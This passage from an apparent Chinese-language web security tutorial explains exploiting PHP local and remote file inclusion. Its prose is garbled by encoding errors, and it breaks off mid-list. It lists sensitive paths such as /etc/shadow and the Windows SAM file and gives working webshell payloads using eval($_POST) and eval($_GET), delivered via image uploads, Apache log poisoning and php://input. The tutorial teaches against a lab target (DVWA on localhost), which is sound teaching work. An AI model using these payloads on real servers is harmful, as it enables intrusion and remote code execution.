<p>ï¼ˆ2ï¼‰ä½¿ç”¨ç›¸å¯¹è·¯å¾„è¿›è¡Œè¯»å–<br>é€šè¿‡.&#x2F;è¡¨ç¤ºå½“å‰ä½ç½®è·¯å¾„ï¼Œ<code>../</code>è¡¨ç¤ºä¸Šä¸€çº§è·¯å¾„ä½ç½®ï¼Œåœ¨linuxä¸­åŒæ ·é€‚ç”¨ã€‚</p>
<p>ä¾‹å¦‚å½“å‰é¡µé¢æ‰€åœ¨è·¯å¾„ä¸º<code>C:\Apache24\htdocs\</code>ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨â€¦&#x2F;é€€åˆ°Cç›˜å†è¿›è¡Œè®¿é—®ï¼Œæ„é€ è·¯å¾„å¦‚ä¸‹ï¼š<br><code>../../windows/system.ini</code></p>
<p>ç”±äºæˆ‘çš„ç¯å¢ƒæ­å»ºåœ¨Dç›˜ï¼Œæ‰€ä»¥è¿™é‡Œå°±ä¸åšæ¼”ç¤ºäº†ã€‚</p>
<p>ï¼ˆ3ï¼‰ä¸€äº›å¸¸è§çš„æ•æ„Ÿç›®å½•ä¿¡æ¯è·¯å¾„:<br>Windowsç³»ç»Ÿ:</p>
<pre><code class="highlight plaintext">C:\boot.ini //æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬
C:\windows\system32\inetsrv\MetaBase.xml //IISé…ç½®æ–‡ä»¶
C:\windows\repair\sam //å­˜å‚¨Windowsç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç 
C:\ProgramFiles\mysql\my.ini //Mysqlé…ç½®
C:\ProgramFiles\mysql\data\mysql\user.MYD //MySQL rootå¯†ç 
C:\windows\php.ini //phpé…ç½®ä¿¡æ¯
Linux/Unixç³»ç»Ÿ:

/etc/password //è´¦æˆ·ä¿¡æ¯
/etc/shadow //è´¦æˆ·å¯†ç ä¿¡æ¯
/usr/local/app/apache2/conf/httpd.conf //Apache2é»˜è®¤é…ç½®æ–‡ä»¶
/usr/local/app/apache2/conf/extra/httpd-vhost.conf //è™šæ‹Ÿç½‘ç«™é…ç½®
/usr/local/app/php5/lib/php.ini //PHPç›¸å…³é…ç½®
/etc/httpd/conf/httpd.conf //Apacheé…ç½®æ–‡ä»¶
/etc/my.conf //mysqlé…ç½®æ–‡ä»¶</code></pre>

<p>ä¸‰ã€LFIæ¼æ´åˆ©ç”¨æŠ€å·§<br>1.é…åˆæ–‡ä»¶ä¸Šä¼ ä½¿ç”¨<br>æœ‰æ—¶å€™æˆ‘ä»¬æ‰¾ä¸åˆ°æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæ— æ³•ä¸Šä¼ webshellï¼Œå¯ä»¥å…ˆä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡æ ¼å¼çš„webshellåˆ°æœåŠ¡å™¨ï¼Œå†åˆ©ç”¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´è¿›è¡Œè§£æã€‚</p>
<p>ä»¥DVWAå¹³å°ä¸ºä¾‹ï¼Œå°†Security Levelé€‰æ‹©lowï¼Œç¼–è¾‘ä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œå†…å®¹å¦‚ä¸‹:</p>
<pre><code class="highlight plaintext">&lt;?php
	fwrite(fopen(&quot;shell.php&quot;,&quot;w&quot;),&#x27;&lt;?php eval($_POST[123]);?&gt;);
?&gt;</code></pre>

<p>æ‰¾åˆ°ä¸Šä¼ ç‚¹è¿›è¡Œä¸Šä¼ ï¼š</p>
<p>å¾—åˆ°æ–‡ä»¶ä¿å­˜çš„å®Œæ•´è·¯å¾„</p>
<p>ç°åœ¨æˆ‘ä»¬åˆ©ç”¨é¡µé¢å»æ‰§è¡Œæˆ‘ä»¬ä¸Šä¼ çš„å›¾ç‰‡é©¬</p>
<p>æœ‰èƒ½å¤Ÿè¯»å–æ–‡ä»¶çš„phpé¡µé¢ï¼Œç›´æ¥æ„é€ urlè¯»å–ï¼Œä»£ç æˆåŠŸè§£æ</p>
<p>æ³¨ï¼šæˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥åœ¨webshell.jpgä¸­å†™ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åå†é€šè¿‡æ–‡ä»¶åŒ…å«æ¼æ´å»è¿æ¥webshell.jpgï¼Œä½†è¿™ç§æ–¹æ³•æœ‰æ—¶å€™webshellåŠŸèƒ½ä¼šå‡ºç°å¼‚å¸¸ã€‚æ‰€ä»¥æˆ‘ä»¬é€‰æ‹©ä¸Šé¢çš„æ–¹å¼ï¼Œç”Ÿæˆä¸€ä¸ª.phpæ ¼å¼çš„ä¸€å¥è¯æœ¨é©¬ï¼Œå†å»è¿æ¥ã€‚</p>
<p>2.åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶<br>æœ‰æ—¶å€™ç½‘ç«™å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä½†æ˜¯å´æ²¡æœ‰æ–‡ä»¶ä¸Šä¼ ç‚¹ã€‚è¿™ä¸ªæ—¶å€™æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡åˆ©ç”¨Apacheçš„æ—¥å¿—æ–‡ä»¶æ¥ç”Ÿæˆä¸€å¥è¯æœ¨é©¬ã€‚</p>
<p>åœ¨ç”¨æˆ·å‘èµ·è¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨ä¼šå°†è¯·æ±‚å†™å…¥access.logï¼Œå½“å‘ç”Ÿé”™è¯¯æ—¶å°†é”™è¯¯å†™å…¥error.logï¼Œæ—¥å¿—æ–‡ä»¶å¦‚ä¸‹:</p>
<p>å½“æˆ‘ä»¬æ­£å¸¸è®¿é—®ä¸€ä¸ªç½‘é¡µæ—¶ï¼Œå¦‚&#96;<a href="http://127.0.0.1/phpinfo.php%EF%BC%8Caccess%E6%97%A5%E5%BF%97%E4%BC%9A%E8%BF%9B%E8%A1%8C%E8%AE%B0%E5%BD%95%EF%BC%8C%E5%A6%82%E4%B8%8B%E5%9B%BE%E6%89%80%E7%A4%BA">http://127.0.0.1/phpinfo.phpï¼Œaccessæ—¥å¿—ä¼šè¿›è¡Œè®°å½•ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º</a>:</p>
<p>å¦‚æœæˆ‘ä»¬è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„èµ„æºï¼Œä¹Ÿä¸€æ ·ä¼šè¿›è¡Œè®°å½•ï¼Œä¾‹å¦‚è®¿é—®</p>
<pre><code class="highlight plaintext">127.0.0.1&lt;?php phpinfo();?&gt;</code></pre>

<p>ç½‘é¡µä¼šæ˜¾ç¤º403</p>
<p>ä½†æŸ¥çœ‹æ—¥å¿—ä¼šå‘ç°è¢«æˆåŠŸè®°å½•ä½†è¢«ç¼–ç äº†</p>
<p>æˆ‘ä»¬å†æ¬¡è¿›è¡Œè®¿é—®ï¼Œå¹¶ä½¿ç”¨burpæŠ“åŒ…ï¼Œå‘ç°è¢«ç¼–ç ï¼š</p>
<p>æˆ‘ä»¬å°†æŠ¥æ–‡ä¿®æ”¹å›å»ï¼Œå†è¿›è¡Œå‘é€å³å¯ï¼š</p>
<p>æ­¤æ—¶å†æŸ¥çœ‹accessæ—¥å¿—ï¼Œæ­£ç¡®å†™å…¥phpä»£ç ï¼š</p>
<p>å†é€šè¿‡æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´è®¿é—®ï¼Œå³å¯æ‰§è¡Œ</p>
<p>æˆ‘ä»¬å¯ä»¥åœ¨æ­¤å¤„å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œå†ä½¿ç”¨webshellç®¡ç†å·¥å…·è¿›è¡Œè¿æ¥ã€‚</p>
<p>3.åŒ…å«SESSIONæ–‡ä»¶<br>å¯ä»¥å…ˆæ ¹æ®å°è¯•åŒ…å«åˆ°SESSIONæ–‡ä»¶ï¼Œåœ¨æ ¹æ®æ–‡ä»¶å†…å®¹å¯»æ‰¾å¯æ§å˜é‡ï¼Œåœ¨æ„é€ payloadæ’å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œæœ€ååŒ…å«å³å¯ã€‚</p>
<p>åˆ©ç”¨æ¡ä»¶:</p>
<p>æ‰¾åˆ°Sessionå†…çš„å¯æ§å˜é‡<br>Sessionæ–‡ä»¶å¯è¯»å†™ï¼Œå¹¶ä¸”çŸ¥é“å­˜å‚¨è·¯å¾„<br>phpçš„sessionæ–‡ä»¶çš„ä¿å­˜è·¯å¾„å¯ä»¥åœ¨phpinfoçš„session.save_pathçœ‹åˆ°ã€‚</p>
<p>sessionå¸¸è§å­˜å‚¨è·¯å¾„:</p>
<p>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID<br>sessionæ–‡ä»¶æ ¼å¼:sess_[phpsessid],è€Œphpsessidåœ¨å‘é€çš„è¯·æ±‚çš„cookieå­—æ®µä¸­å¯ä»¥çœ‹åˆ°ã€‚<br>ç›¸å…³æ¡ˆä¾‹å¯ä»¥æŸ¥çœ‹è¿™é“CTFé¢˜ä¸€é“CTFé¢˜ï¼šPHPæ–‡ä»¶åŒ…å«</p>
<p>4.åŒ…å«ä¸´æ—¶æ–‡ä»¶</p>
<p>phpä¸­ä¸Šä¼ æ–‡ä»¶ï¼Œä¼šåˆ›å»ºä¸´æ—¶æ–‡ä»¶ã€‚åœ¨linuxä¸‹ä½¿ç”¨&#x2F;tmpç›®å½•ï¼Œè€Œåœ¨windowsä¸‹ä½¿ç”¨C:\windows\tempç›®å½•ã€‚åœ¨ä¸´æ—¶æ–‡ä»¶è¢«åˆ é™¤å‰ï¼Œå¯ä»¥åˆ©ç”¨æ—¶é—´ç«äº‰çš„æ–¹å¼åŒ…å«è¯¥ä¸´æ—¶æ–‡ä»¶ã€‚</p>
<p>ç”±äºåŒ…å«éœ€è¦çŸ¥é“åŒ…å«çš„æ–‡ä»¶åã€‚ä¸€ç§æ–¹æ³•æ˜¯è¿›è¡Œæš´åŠ›çŒœè§£ï¼Œlinuxä¸‹ä½¿ç”¨çš„æ˜¯éšæœºå‡½æ•°æœ‰ç¼ºé™·ï¼Œè€Œwindowsä¸‹åªæœ‰65535ç§ä¸åŒçš„æ–‡ä»¶åï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•æ˜¯å¯è¡Œçš„ã€‚</p>
<p>å¦ä¸€ç§æ–¹æ³•æ˜¯é…åˆphpinfoé¡µé¢çš„php variablesï¼Œå¯ä»¥ç›´æ¥è·å–åˆ°ä¸Šä¼ æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„å’Œä¸´æ—¶æ–‡ä»¶åï¼Œç›´æ¥åŒ…å«å³å¯ã€‚</p>
<p>è¿™ä¸ªæ–¹æ³•å¯ä»¥å‚è€ƒLFI With PHPInfo Assistance<br>ç±»ä¼¼åˆ©ç”¨ä¸´æ—¶æ–‡ä»¶çš„å­˜åœ¨ï¼Œç«äº‰æ—¶é—´å»åŒ…å«çš„ï¼Œå¯ä»¥çœ‹çœ‹è¿™é“CTFé¢˜ï¼š XMANå¤ä»¤è¥-2017-babyweb-writeup</p>
<h2 id="è¿œç¨‹æ–‡ä»¶åŒ…å«-RFI"><a href="#è¿œç¨‹æ–‡ä»¶åŒ…å«-RFI" class="headerlink" title="è¿œç¨‹æ–‡ä»¶åŒ…å«(RFI)"></a>è¿œç¨‹æ–‡ä»¶åŒ…å«(RFI)</h2><h2 id="å¿…å¤‡çŸ¥è¯†-phpä¼ªåè®®"><a href="#å¿…å¤‡çŸ¥è¯†-phpä¼ªåè®®" class="headerlink" title="å¿…å¤‡çŸ¥è¯†:phpä¼ªåè®®"></a>å¿…å¤‡çŸ¥è¯†:phpä¼ªåè®®</h2><h3 id="file-åè®®"><a href="#file-åè®®" class="headerlink" title="file:// åè®®"></a><code>file://</code> åè®®</h3><ul>
<li><p><strong>æ¡ä»¶</strong>ï¼š</p>
<ul>
<li><code>allow_url_fopen</code>:off&#x2F;on</li>
<li><code>allow_url_include</code> :off&#x2F;on</li>
</ul>
</li>
<li><p><strong>ä½œç”¨</strong>ï¼š<br>ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨CTFä¸­é€šå¸¸ç”¨æ¥<strong>è¯»å–æœ¬åœ°æ–‡ä»¶</strong>çš„ä¸”ä¸å—<code>allow_url_fopen</code>ä¸<code>allow_url_include</code>çš„å½±å“ã€‚<br><code>include()/require()/include_once()/require_once()</code>å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œå¦‚å¯¼å…¥ä¸ºé<code>.php</code>æ–‡ä»¶ï¼Œåˆ™ä»æŒ‰ç…§phpè¯­æ³•è¿›è¡Œè§£æï¼Œè¿™æ˜¯<code>include()</code>å‡½æ•°æ‰€å†³å®šçš„ã€‚</p>
</li>
<li><p><strong>è¯´æ˜</strong>ï¼š<br><code>file://</code> æ–‡ä»¶ç³»ç»Ÿæ˜¯ PHP ä½¿ç”¨çš„é»˜è®¤å°è£…åè®®ï¼Œå±•ç°äº†æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€‚å½“æŒ‡å®šäº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼ˆä¸ä»¥&#x2F;ã€ã€\æˆ– Windows ç›˜ç¬¦å¼€å¤´çš„è·¯å¾„ï¼‰æä¾›çš„è·¯å¾„å°†åŸºäºå½“å‰çš„å·¥ä½œç›®å½•ã€‚åœ¨å¾ˆå¤šæƒ…å†µä¸‹æ˜¯è„šæœ¬æ‰€åœ¨çš„ç›®å½•ï¼Œé™¤éè¢«ä¿®æ”¹äº†ã€‚ä½¿ç”¨ CLI çš„æ—¶å€™ï¼Œç›®å½•é»˜è®¤æ˜¯è„šæœ¬è¢«è°ƒç”¨æ—¶æ‰€åœ¨çš„ç›®å½•ã€‚åœ¨æŸäº›å‡½æ•°é‡Œï¼Œä¾‹å¦‚ <code>fopen()</code> å’Œ <code>file_get_contents()</code>ï¼Œ<code>include_path </code>ä¼šå¯é€‰åœ°æœç´¢ï¼Œä¹Ÿä½œä¸ºç›¸å¯¹çš„è·¯å¾„ã€‚</p>
</li>
<li><p><strong>ç”¨æ³•</strong>ï¼š</p>
<pre><code class="highlight pgsql">/<span class="type">path</span>/<span class="keyword">to</span>/file.ext
relative/<span class="type">path</span>/<span class="keyword">to</span>/file.ext
fileInCwd.ext
C:/<span class="type">path</span>/<span class="keyword">to</span>/winfile.ext
C:\<span class="type">path</span>\<span class="keyword">to</span>\winfile.ext
\\smbserver\<span class="keyword">share</span>\<span class="type">path</span>\<span class="keyword">to</span>\winfile.ext
file:///<span class="type">path</span>/<span class="keyword">to</span>/file.ext</code></pre>
</li>
<li><p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<ol>
<li><p><code>file://[æ–‡ä»¶çš„ç»å¯¹è·¯å¾„å’Œæ–‡ä»¶å]</code></p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQAZ" alt="å›¾ç‰‡æè¿°"></p>
</li>
<li><p><code>[æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„å’Œæ–‡ä»¶å]</code></p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=./phpinfo.txt</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQA1" alt="å›¾ç‰‡æè¿°"></p>
</li>
<li><p><code>[httpï¼š//ç½‘ç»œè·¯å¾„å’Œæ–‡ä»¶å]</code></p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBb" alt="å›¾ç‰‡æè¿°"></p>
</li>
</ol>
</li>
<li><p><strong>å‚è€ƒ</strong>ï¼š<a href="https://link.segmentfault.com/?enc=YtcHVUno34rLTBJUcxsHxA==.SAMo1ZcMmiqVqJxFosbgOTO2nJi4mSvGX5no8jrMTl7u2z1qAxlTLJm6Xm7Rs3Ze">http://php.net/manual/zh/wrappers.file.php</a></p>
</li>
</ul>
<h3 id="php-åè®®"><a href="#php-åè®®" class="headerlink" title="php:// åè®®"></a><code>php://</code> åè®®</h3><ul>
<li><p><strong>æ¡ä»¶</strong>ï¼š</p>
<ul>
<li><code>allow_url_fopen</code>:off&#x2F;on</li>
<li><code>allow_url_include</code> :ä»…<code>php://input php://stdin php://memory php://temp </code>éœ€è¦on</li>
</ul>
</li>
<li><p><strong>ä½œç”¨</strong>ï¼š<br><code>php://</code> è®¿é—®å„ä¸ªè¾“å…¥&#x2F;è¾“å‡ºæµï¼ˆI&#x2F;O streamsï¼‰ï¼Œåœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ˜¯<code>php://filter</code>å’Œ<code>php://input</code>ï¼Œ<code>php://filter</code>ç”¨äº<strong>è¯»å–æºç </strong>ï¼Œ<code>php://input</code>ç”¨äº<strong>æ‰§è¡Œphpä»£ç </strong>ã€‚</p>
</li>
<li><p><strong>è¯´æ˜</strong>ï¼š<br>PHP æä¾›äº†ä¸€äº›æ‚é¡¹è¾“å…¥&#x2F;è¾“å‡ºï¼ˆIOï¼‰æµï¼Œå…è®¸è®¿é—® PHP çš„è¾“å…¥è¾“å‡ºæµã€æ ‡å‡†è¾“å…¥è¾“å‡ºå’Œé”™è¯¯æè¿°ç¬¦ï¼Œ<br>å†…å­˜ä¸­ã€ç£ç›˜å¤‡ä»½çš„ä¸´æ—¶æ–‡ä»¶æµä»¥åŠå¯ä»¥æ“ä½œå…¶ä»–è¯»å–å†™å…¥æ–‡ä»¶èµ„æºçš„è¿‡æ»¤å™¨ã€‚</p>
<table>
<thead>
<tr>
<th>åè®®</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td>php:&#x2F;&#x2F;input</td>
<td>å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œåœ¨POSTè¯·æ±‚ä¸­è®¿é—®POSTçš„<code>data</code>éƒ¨åˆ†ï¼Œåœ¨<code>enctype=&quot;multipart/form-data&quot;</code> çš„æ—¶å€™<code>php://input </code>æ˜¯æ— æ•ˆçš„ã€‚</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;output</td>
<td>åªå†™çš„æ•°æ®æµï¼Œå…è®¸ä»¥ print å’Œ echo ä¸€æ ·çš„æ–¹å¼å†™å…¥åˆ°è¾“å‡ºç¼“å†²åŒºã€‚</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;fd</td>
<td>(&gt;&#x3D;5.3.6)å…è®¸ç›´æ¥è®¿é—®æŒ‡å®šçš„æ–‡ä»¶æè¿°ç¬¦ã€‚ä¾‹å¦‚ <code>php://fd/3</code> å¼•ç”¨äº†æ–‡ä»¶æè¿°ç¬¦ 3ã€‚</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;memory php:&#x2F;&#x2F;temp</td>
<td>(&gt;&#x3D;5.1.0)ä¸€ä¸ªç±»ä¼¼æ–‡ä»¶åŒ…è£…å™¨çš„æ•°æ®æµï¼Œå…è®¸è¯»å†™ä¸´æ—¶æ•°æ®ã€‚ä¸¤è€…çš„å”¯ä¸€åŒºåˆ«æ˜¯ <code>php://memory</code> æ€»æ˜¯æŠŠæ•°æ®å‚¨å­˜åœ¨å†…å­˜ä¸­ï¼Œè€Œ <code>php://temp</code> ä¼šåœ¨å†…å­˜é‡è¾¾åˆ°é¢„å®šä¹‰çš„é™åˆ¶åï¼ˆé»˜è®¤æ˜¯ <code>2MB</code>ï¼‰å­˜å…¥ä¸´æ—¶æ–‡ä»¶ä¸­ã€‚ä¸´æ—¶æ–‡ä»¶ä½ç½®çš„å†³å®šå’Œ <code>sys_get_temp_dir()</code> çš„æ–¹å¼ä¸€è‡´ã€‚</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;filter</td>
<td>(&gt;&#x3D;5.0.0)ä¸€ç§å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚å¯¹äºä¸€ä½“å¼<code>ï¼ˆall-in-oneï¼‰</code>çš„æ–‡ä»¶å‡½æ•°éå¸¸æœ‰ç”¨ï¼Œç±»ä¼¼ <code>readfile()</code>ã€<code>file()</code> å’Œ <code>file_get_contents()</code>ï¼Œåœ¨æ•°æ®æµå†…å®¹è¯»å–ä¹‹å‰æ²¡æœ‰æœºä¼šåº”ç”¨å…¶ä»–è¿‡æ»¤å™¨ã€‚</td>
</tr>
</tbody></table>
</li>
<li><p><strong><code>php://filter</code>å‚æ•°è¯¦è§£</strong></p>
<p>è¯¥åè®®çš„å‚æ•°ä¼šåœ¨è¯¥åè®®è·¯å¾„ä¸Šè¿›è¡Œä¼ é€’ï¼Œå¤šä¸ªå‚æ•°éƒ½å¯ä»¥åœ¨ä¸€ä¸ªè·¯å¾„ä¸Šä¼ é€’ã€‚å…·ä½“å‚è€ƒå¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th>php:&#x2F;&#x2F;filter å‚æ•°</th>
<th>æè¿°</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>resource&#x3D;&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt;</td>
<td>å¿…é¡»é¡¹ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚</td>
<td></td>
</tr>
<tr>
<td>read&#x3D;&lt;è¯»é“¾çš„è¿‡æ»¤å™¨&gt;</td>
<td>å¯é€‰é¡¹ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ*\</td>
<td>*ï¼‰åˆ†éš”ã€‚</td>
</tr>
<tr>
<td>write&#x3D;&lt;å†™é“¾çš„è¿‡æ»¤å™¨&gt;</td>
<td>å¯é€‰é¡¹ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ\</td>
<td>ï¼‰åˆ†éš”ã€‚</td>
</tr>
<tr>
<td>&lt;; ä¸¤ä¸ªé“¾çš„è¿‡æ»¤å™¨&gt;</td>
<td>ä»»ä½•æ²¡æœ‰ä»¥ <em>read&#x3D;</em> æˆ– <em>write&#x3D;</em> ä½œå‰ç¼€çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚</td>
<td></td>
</tr>
</tbody></table>
</li>
<li><p><strong>å¯ç”¨çš„è¿‡æ»¤å™¨åˆ—è¡¨ï¼ˆ4ç±»ï¼‰</strong></p>
<p>æ­¤å¤„åˆ—ä¸¾ä¸»è¦çš„è¿‡æ»¤å™¨ç±»å‹ï¼Œè¯¦ç»†å†…å®¹è¯·å‚è€ƒï¼š<a href="https://link.segmentfault.com/?enc=XLl1qyeGwRWWMG9dw9ESmQ==.0ts2nAacIjZZ+DTLJ5T0ocshPXAgZLYKgYBybI8Dc7yazO2QRQTOjf/jsO5rq19t">https://www.php.net/manual/zh/filters.php</a></p>
<table>
<thead>
<tr>
<th>å­—ç¬¦ä¸²è¿‡æ»¤å™¨</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td>string.rot13</td>
<td>ç­‰åŒäº<code>str_rot13()</code>ï¼Œrot13å˜æ¢</td>
</tr>
<tr>
<td>string.toupper</td>
<td>ç­‰åŒäº<code>strtoupper()</code>ï¼Œè½¬å¤§å†™å­—æ¯</td>
</tr>
<tr>
<td>string.tolower</td>
<td>ç­‰åŒäº<code>strtolower()</code>ï¼Œè½¬å°å†™å­—æ¯</td>
</tr>
<tr>
<td>string.strip_tags</td>
<td>ç­‰åŒäº<code>strip_tags()</code>ï¼Œå»é™¤htmlã€PHPè¯­è¨€æ ‡ç­¾</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>è½¬æ¢è¿‡æ»¤å™¨</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td>convert.base64-encode &amp; convert.base64-decode</td>
<td>ç­‰åŒäº<code>base64_encode()</code>å’Œ<code>base64_decode()</code>ï¼Œbase64ç¼–ç è§£ç </td>
</tr>
<tr>
<td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td>
<td>quoted-printable å­—ç¬¦ä¸²ä¸ 8-bit å­—ç¬¦ä¸²ç¼–ç è§£ç </td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>å‹ç¼©è¿‡æ»¤å™¨</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td>zlib.deflate &amp; zlib.inflate</td>
<td>åœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»º gzip å…¼å®¹æ–‡ä»¶çš„æ–¹æ³•ï¼Œä½†ä¸äº§ç”Ÿå‘½ä»¤è¡Œå·¥å…·å¦‚ gzipçš„å¤´å’Œå°¾ä¿¡æ¯ã€‚åªæ˜¯å‹ç¼©å’Œè§£å‹æ•°æ®æµä¸­çš„æœ‰æ•ˆè½½è·éƒ¨åˆ†ã€‚</td>
</tr>
<tr>
<td>bzip2.compress &amp; bzip2.decompress</td>
<td>åŒä¸Šï¼Œåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»º bz2 å…¼å®¹æ–‡ä»¶çš„æ–¹æ³•ã€‚</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>åŠ å¯†è¿‡æ»¤å™¨</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td>mcrypt.*</td>
<td>libmcrypt å¯¹ç§°åŠ å¯†ç®—æ³•</td>
</tr>
<tr>
<td>mdecrypt.*</td>
<td>libmcrypt å¯¹ç§°è§£å¯†ç®—æ³•</td>
</tr>
</tbody></table>
</li>
<li><p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<ol>
<li><p><code>php://filter/read=convert.base64-encode/resource=[æ–‡ä»¶å]</code>è¯»å–æ–‡ä»¶æºç ï¼ˆé’ˆå¯¹phpæ–‡ä»¶éœ€è¦base64ç¼–ç ï¼‰</p>
<pre><code class="highlight livecodeserver"><span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="built_in">include</span>.php?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=phpinfo.php</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBf" alt="å›¾ç‰‡æè¿°"></p>
</li>
<li><p><code>php://input + [POST DATA]</code>æ‰§è¡Œphpä»£ç </p>
<pre><code class="highlight php">http:<span class="comment">//127.0.0.1/include.php?file=php://input</span>
[POST DATAéƒ¨åˆ†]
<span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBh" alt="å›¾ç‰‡æè¿°"></p>
<p>è‹¥æœ‰å†™å…¥æƒé™ï¼Œå†™å…¥ä¸€å¥è¯æœ¨é©¬</p>
<pre><code class="highlight php">http:<span class="comment">//127.0.0.1/include.php?file=php://input</span>
[POST DATAéƒ¨åˆ†]
<span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;1juhua.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;</span>); <span class="meta">?&gt;</span></code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBi" alt="å›¾ç‰‡æè¿°"></p>
</li>
</ol>
</li>
<li><p><strong>å‚è€ƒ</strong>ï¼š<a href="https://link.segmentfault.com/?enc=AHKgds+Ge0QaKChQ1m1oog==.na4Zlt5y4duEWHHydmOSTh2NkSbiDQNUtTreUgqxsETwe3g04SdnSBMCMdEdQ27X">https://php.net/manual/zh/wrappers.php.php</a></p>
</li>
</ul>
<h3 id="zip-bzip2-zlib-åè®®"><a href="#zip-bzip2-zlib-åè®®" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib:// åè®®"></a><code>zip:// &amp; bzip2:// &amp; zlib://</code> åè®®</h3><ul>
<li><p><strong>æ¡ä»¶</strong>ï¼š</p>
<ul>
<li><code>allow_url_fopen</code>:off&#x2F;on</li>
<li><code>allow_url_include</code> :off&#x2F;on</li>
</ul>
</li>
<li><p><strong>ä½œç”¨</strong>ï¼š<code>zip:// &amp; bzip2:// &amp; zlib://</code> å‡å±äºå‹ç¼©æµï¼Œå¯ä»¥è®¿é—®å‹ç¼©æ–‡ä»¶ä¸­çš„å­æ–‡ä»¶ï¼Œæ›´é‡è¦çš„æ˜¯ä¸éœ€è¦æŒ‡å®šåç¼€åï¼Œå¯ä¿®æ”¹ä¸ºä»»æ„åç¼€ï¼š<code>jpg png gif xxx</code> ç­‰ç­‰ã€‚</p>
</li>
<li><p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<ol>
